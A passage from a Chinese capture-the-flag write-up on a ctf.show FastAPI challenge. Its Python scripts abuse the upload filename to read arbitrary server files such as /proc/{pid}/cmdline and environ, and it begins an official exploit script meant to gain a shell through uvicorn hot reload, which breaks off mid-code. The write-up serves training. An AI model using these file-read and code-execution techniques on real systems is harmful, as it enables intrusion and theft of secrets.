</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=p>},</span>
</span></span><span class=line><span class=cl>          <span class=s2>&#34;422&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;description&#34;</span><span class=p>:</span> <span class=s2>&#34;Validation Error&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;content&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;application/json&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;schema&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=s2>&#34;$ref&#34;</span><span class=p>:</span> <span class=s2>&#34;#/components/schemas/HTTPValidationError&#34;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;/list&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;get&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;summary&#34;</span><span class=p>:</span> <span class=s2>&#34;List File&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;operationId&#34;</span><span class=p>:</span> <span class=s2>&#34;list_file_list_get&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;responses&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=s2>&#34;200&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;description&#34;</span><span class=p>:</span> <span class=s2>&#34;Successful Response&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;content&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;application/json&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;schema&#34;</span><span class=p>:</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>},</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;/&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;get&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;summary&#34;</span><span class=p>:</span> <span class=s2>&#34;Index&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;operationId&#34;</span><span class=p>:</span> <span class=s2>&#34;index__get&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;responses&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=s2>&#34;200&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;description&#34;</span><span class=p>:</span> <span class=s2>&#34;Successful Response&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;content&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;application/json&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=s2>&#34;schema&#34;</span><span class=p>:</span> <span class=p>{}</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>},</span>
</span></span><span class=line><span class=cl>  <span class=s2>&#34;components&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;schemas&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;Body_upload_file_upload__post&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;object&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;required&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;file&#34;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;properties&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=s2>&#34;file&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;format&#34;</span><span class=p>:</span> <span class=s2>&#34;binary&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=s2>&#34;File&#34;</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>},</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=s2>&#34;Body_upload_file_upload__post&#34;</span>
</span></span><span class=line><span class=cl>      <span class=p>},</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;HTTPValidationError&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;object&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=s2>&#34;HTTPValidationError&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;properties&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=s2>&#34;detail&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;array&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=s2>&#34;Detail&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;items&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;$ref&#34;</span><span class=p>:</span> <span class=s2>&#34;#/components/schemas/ValidationError&#34;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>},</span>
</span></span><span class=line><span class=cl>      <span class=s2>&#34;ValidationError&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;object&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=s2>&#34;ValidationError&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;required&#34;</span><span class=p>:</span> <span class=p>[</span><span class=s2>&#34;loc&#34;</span><span class=p>,</span> <span class=s2>&#34;msg&#34;</span><span class=p>,</span> <span class=s2>&#34;type&#34;</span><span class=p>],</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;properties&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=s2>&#34;loc&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;array&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=s2>&#34;Location&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;items&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=s2>&#34;anyOf&#34;</span><span class=p>:</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span>
</span></span><span class=line><span class=cl>                <span class=p>},</span>
</span></span><span class=line><span class=cl>                <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;integer&#34;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=p>},</span>
</span></span><span class=line><span class=cl>          <span class=s2>&#34;msg&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=s2>&#34;Message&#34;</span>
</span></span><span class=line><span class=cl>          <span class=p>},</span>
</span></span><span class=line><span class=cl>          <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;type&#34;</span><span class=p>:</span> <span class=s2>&#34;string&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=s2>&#34;Error Type&#34;</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p><code>/upload</code>用来上传文件，必须包含一个类型为 <code>multipart/form-data</code> 的文件，文件字段名称为 <code>file</code></p><p><code>/uploads/{fileIndex}</code> (GET)用来下载指定文件</p><p><code>/list</code> (GET)列出所有上传的文件。</p><p>就是这三个路由比较有用，直接写个脚本来上传文件再下载文件看看后端是啥情况</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://0d6210c3-d789-4945-b6ca-cfb020fd32ff.challenge.ctf.show/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>name</span><span class=o>=</span><span class=s2>&#34;wi&#34;</span>
</span></span><span class=line><span class=cl><span class=n>r1</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;upload/&#34;</span><span class=p>,</span><span class=n>files</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;file&#34;</span><span class=p>:(</span><span class=n>name</span><span class=p>,</span><span class=s2>&#34;wi&#34;</span><span class=p>)})</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r1</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>fileIndex</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;&#34;fileName&#34;:&#34;([^&#34;]+)&#34;&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>r1</span><span class=o>.</span><span class=n>text</span><span class=p>))</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># print(fileIndex)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>r2</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;uploads/&#34;</span><span class=o>+</span><span class=n>fileIndex</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r2</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># {&#34;fileName&#34;:&#34;75754b69-ab64-48cc-9013-1456810cb9e9&#34;}</span>
</span></span><span class=line><span class=cl><span class=c1># 75754b69-ab64-48cc-9013-1456810cb9e9</span>
</span></span><span class=line><span class=cl><span class=c1># {&#34;fileName&#34;:&#34;75754b69-ab64-48cc-9013-1456810cb9e9&#34;,&#34;fileContent&#34;:&#34;wi&#34;}</span>
</span></span></code></pre></td></tr></table></div></div><p>那我们可以直接利用这个来进行任意文件读取</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>re</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>url</span><span class=o>=</span><span class=s2>&#34;http://0d6210c3-d789-4945-b6ca-cfb020fd32ff.challenge.ctf.show/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload</span><span class=p>(</span><span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>r1</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;upload/&#34;</span><span class=p>,</span><span class=n>files</span><span class=o>=</span><span class=p>{</span><span class=s2>&#34;file&#34;</span><span class=p>:(</span><span class=n>name</span><span class=p>,</span><span class=s2>&#34;wi&#34;</span><span class=p>)})</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(r1.text)</span>
</span></span><span class=line><span class=cl>    <span class=n>fileIndex</span><span class=o>=</span><span class=n>re</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=sa>r</span><span class=s1>&#39;&#34;fileName&#34;:&#34;([^&#34;]+)&#34;&#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>r1</span><span class=o>.</span><span class=n>text</span><span class=p>))</span><span class=o>.</span><span class=n>group</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(fileIndex)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r2</span><span class=o>=</span><span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span><span class=o>+</span><span class=s2>&#34;uploads/&#34;</span><span class=o>+</span><span class=n>fileIndex</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>r2</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>pid</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>16</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=c1># filename=f&#34;/proc/{pid}/environ&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>filename</span><span class=o>=</span><span class=sa>f</span><span class=s2>&#34;/proc/</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s2>/cmdline&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>upload</span><span class=p>(</span><span class=n>filename</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(pid)</span>
</span></span></code></pre></td></tr></table></div></div><p>让AI把结果给整理一下</p><div class=table-wrapper><table><thead><tr><th>文件名</th><th>文件内容描述</th></tr></thead><tbody><tr><td>3748af35-aff4-4b5a-38e66e4eaee8</td><td><code>/bin/sh\u0000-c\u0000/usr/start.sh\u0000</code></td></tr><tr><td>4a0ef4f8-7ba8-41b2-893b-8a4559918823</td><td><code>/bin/sh\u0000/usr/start.sh\u0000</code></td></tr><tr><td>309c77ec-ce72-45f1-acdd-4e1e45b0b495</td><td><code>/usr/local/bin/python\u0000/usr/local/bin/uvicorn\u0000ctfshow2024secret:app\u0000--host\u00000.0.0.0\u0000--reload\u0000</code></td></tr><tr><td>afb2c29e-7398-4660-8caf-bd289ebcf78f</td><td><code>/usr/local/bin/python\u0000-c\u0000from multiprocessing.resource_tracker import main;main(4)\u0000</code></td></tr><tr><td>c810ca97-d4c4-433f-8548-9ecdac3aec97</td><td><code>/usr/local/bin/python\u0000-c\u0000from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe</code></td></tr><tr><td>9fec5735-f46f-4304-988b-64a179f190ab</td><td><code>/usr/local/bin/python\u0000/usr/local/bin/uvicorn\u0000ctfshow2024secret:app\u0000--host\u00000.0.0.0\u0000--reload\u0000</code></td></tr><tr><td>365dd01e-f3a7-48ba-a6a5-183a72bedc56</td><td><code>/usr/local/bin/python\u0000-c\u0000from multiprocessing.spawn import spawn_main; spawn_main(tracker_fd=5, pipe</code></td></tr></tbody></table></div><p>得到了<code>/ctfshowsecretdir</code>和<code>ctfshow2024secret:app</code>，并且有<code>reload</code>参数，属于是可以进行热加载了，那我们写个api木马，然后热加载就可以getshell了，上官方脚本</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># -*- coding : utf-8 -*-</span>
</span></span><span class=line><span class=cl><span class=c1># coding: utf-8</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>io</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s2>&#34;http://9592da74-5008-4433-8764-1805b7b5d679.challenge.ctf.show/&#34;</span>
</span></span><span class=line><span class=cl><span class=n>app</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=c1># Author:ctfshow-h1xa</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_api</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>response</span> <span class=o>=</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>url</span><span class=o>=</span><span class=n>url</span> <span class=o>+</span> <span class=s2>&#34;openapi.json&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=s2>&#34;FastAPI&#34;</span> <span class=ow>in</span> <span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>apijson</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>response</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>apijson</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_pwd</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>pwd</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>pid</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>20</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/proc/</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s1>/environ&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>file</span> <span class=o>=</span> <span class=n>upload</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=n>download</span><span class=p>(</span><span class=n>file</span><span class=p>[</span><span class=s1>&#39;fileName&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>content</span><span class=p>[</span><span class=s1>&#39;fileName&#39;</span><span class=p>]</span> <span class=ow>and</span> <span class=s1>&#39;PWD&#39;</span> <span class=ow>in</span> <span class=n>content</span><span class=p>[</span><span class=s1>&#39;fileContent&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=n>pwd</span> <span class=o>=</span> <span class=n>content</span><span class=p>[</span><span class=s1>&#39;fileContent&#39;</span><span class=p>][</span>
</span></span><span class=line><span class=cl>                  <span class=n>content</span><span class=p>[</span><span class=s1>&#39;fileContent&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;PWD=&#34;</span><span class=p>)</span> <span class=o>+</span> <span class=mi>4</span><span class=p>:</span><span class=n>content</span><span class=p>[</span><span class=s1>&#39;fileContent&#39;</span><span class=p>]</span><span class=o>.</span><span class=n>find</span><span class=p>(</span><span class=s2>&#34;GPG_KEY=&#34;</span><span class=p>)]</span> <span class=o>+</span> <span class=s1>&#39;/&#39;</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>pwd</span>
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl> 
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_python_file</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>python_file</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>pid</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>20</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>data</span> <span class=o>=</span> <span class=sa>f</span><span class=s1>&#39;/proc/</span><span class=si>{</span><span class=n>pid</span><span class=si>}</span><span class=s1>/cmdline&#39;</span>
</span></span><span class=line><span class=cl>        <span class=n>file</span> <span class=o>=</span> <span class=n>upload</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>content</span> <span class=o>=</span> <span class=n>download</span><span class=p>(</span><span class=n>file</span><span class=p>[</span><span class=s1>&#39;fileName&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>content</span><span class=p>[</span><span class=s1>&#39;fileName&#39;</span><span class=p>]</span> <span class=ow>and</span> <span class=s1>&#39;uvicorn&#39;</span> <span class=ow>in</span> <span class=n>content</span><span class=p>[</span><span class=s1>&#39;fileContent&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=s1>&#39;reload&#39;</span> <span class=ow>in</span> <span class=n>content</span><span class=p>[</span><span class=s1>&#39;fileContent&#39;</span><span class=p>]:</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[√] 检测到存在reload参数，可以进行热部署&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=n>python_file</span> <span class=o>=</span> <span class=n>content</span><span class=p>[</span><span class=s1>&#39;fileContent&#39;</span><span class=p>][</span>
